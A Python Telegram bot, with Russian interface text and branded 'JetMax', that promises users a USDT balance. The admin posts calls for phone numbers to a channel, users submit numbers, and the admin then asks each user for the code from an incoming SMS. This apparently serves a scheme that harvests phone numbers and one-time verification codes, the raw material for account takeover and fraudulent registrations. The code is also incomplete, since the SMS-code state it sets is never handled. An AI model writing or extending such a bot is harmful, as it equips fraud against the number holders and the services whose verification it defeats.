import asyncio
import asyncpg
import os
import time
import json
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_URL = os.getenv("CHANNEL_URL")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
DATABASE_URL = os.getenv("DATABASE_URL")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
db_pool = None

async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(DATABASE_URL)
    async with db_pool.acquire() as conn:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                current_number TEXT,
                number_timestamp BIGINT,
                balance DECIMAL(10,2) DEFAULT 0.00,
                state TEXT,
                state_data TEXT
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS requests (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                username TEXT,
                number TEXT,
                status TEXT,
                created_at BIGINT
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS approved_requests (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                username TEXT,
                number TEXT,
                request_number INTEGER,
                created_at BIGINT
            )
        ''')

def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="💰 Баланс")]],
        resize_keyboard=True
    )

def get_chat_id():
    url = CHANNEL_URL
    if url.startswith("https://t.me/"):
        return f"@{url.replace('https://t.me/', '')}"
    elif url.startswith("@"):
        return url
    else:
        return int(url)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.full_name
    async with db_pool.acquire() as conn:
        await conn.execute('''
            INSERT INTO users (user_id, username) VALUES ($1, $2)
            ON CONFLICT (user_id) DO UPDATE SET username = $2
        ''', user_id, username)
    
    await message.answer(
        f"🔐 JetMax - твое богатое будущее!\nДля работы подпишись на канал: {CHANNEL_URL}",
        reply_markup=get_main_keyboard()
    )

@dp.message(F.text == "💰 Баланс")
async def show_balance(message: types.Message):
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", message.from_user.id)
        balance = row["balance"] if row else 0.00
    await message.answer(f"💳 Баланс: {balance:.2f} USDT")

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Создать заявку", callback_data="admin_create")]
    ])
    await message.answer("Админ панель:", reply_markup=keyboard)

@dp.callback_query(F.data == "admin_create")
async def admin_create(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещен")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Сдать номер", callback_data="send_number")]
    ])
    await bot.send_message(
        get_chat_id(),
        "💼 Требуется номер!\n⏱️ Нажми кнопку для сдачи",
        reply_markup=keyboard
    )
    await callback.answer("Заявка создана")

@dp.callback_query(F.data == "send_number")
async def call_send_number(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    username = callback.from_user.username or callback.from_user.full_name
    
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow("SELECT current_number, number_timestamp FROM users WHERE user_id = $1", user_id)
        if user and user["current_number"] and user["number_timestamp"]:
            elapsed = int(time.time()) - user["number_timestamp"]
            if elapsed < 600:
                remaining = 600 - elapsed
                minutes = remaining // 60
                seconds = remaining % 60
                await bot.send_message(user_id, f"⏳ Подожди {minutes:02d}:{seconds:02d}")
                await callback.answer()
                return
        
        await conn.execute('''
            UPDATE users SET state = 'waiting_number', state_data = $1 WHERE user_id = $2
        ''', json.dumps({"username": username}), user_id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отменить", callback_data="cancel")]
    ])
    await bot.send_message(user_id, "📱 Отправь номер:", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "cancel")
async def cancel(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE users SET state = NULL, state_data = NULL WHERE user_id = $1", user_id)
    await callback.message.answer("❌ Отменено")
    await callback.answer()

@dp.message()
async def handle_all_messages(message: types.Message):
    user_id = message.from_user.id
    
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow("SELECT state, state_data FROM users WHERE user_id = $1", user_id)
        
        if user and user["state"] == "waiting_number":
            number = message.text.strip()
            data = json.loads(user["state_data"])
            username = data.get("username", message.from_user.username or message.from_user.full_name)
            
            await conn.execute('''
                UPDATE users SET current_number = $1, number_timestamp = $2, state = NULL, state_data = NULL WHERE user_id = $3
            ''', number, int(time.time()), user_id)
            
            await conn.execute('''
                INSERT INTO requests (user_id, username, number, status, created_at) 
                VALUES ($1, $2, $3, 'waiting_sms', $4)
            ''', user_id, username, number, int(time.time()))
            
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Запросить смс", callback_data=f"req_sms_{user_id}"),
                 InlineKeyboardButton(text="Отклонить", callback_data=f"reject_{user_id}")]
            ])
            
            await bot.send_message(
                ADMIN_ID,
                f"💼 Новая заявка от @{username} [{user_id}]\nНомер: {number}",
                reply_markup=keyboard
            )
            await message.answer("✅ Номер принят")
            return
    
    await message.answer("❓ Неизвестная команда. Используй /start")

@dp.callback_query(F.data.startswith("req_sms_"))
async def request_sms(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE users SET state = 'waiting_sms' WHERE user_id = $1", user_id)
    await bot.send_message(user_id, "🔐 Введи код из смс:")
    await callback.answer()

@dp.callback_query(F.data.startswith("reject_"))
async def reject(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
    await bot.send_message(user_id, "❌ Заявка отклонена")
    await callback.answer()

async def main():
    await init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    print("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
